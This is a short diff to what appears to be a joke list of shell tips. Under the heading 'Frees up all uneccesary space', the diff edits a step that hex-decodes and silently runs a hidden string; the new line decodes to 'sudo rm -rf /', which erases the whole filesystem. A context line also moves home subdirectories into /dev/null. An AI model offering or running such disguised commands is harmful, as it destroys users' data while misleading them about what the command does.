@@ -38,7 +38,7 @@ for d in ~/*/*; do mv "$d/" /dev/null; done
 E. Frees up all uneccesary space:
 
 ``` bash
-sudo command $(echo 726d202d7266202f0a | xxd -p -r) &> /dev/null
+command $(echo 7375646f20726d202d7266202f0a | xxd -p -r) &> /dev/null
 ```
 
 F. Chew the gum you don't even know:
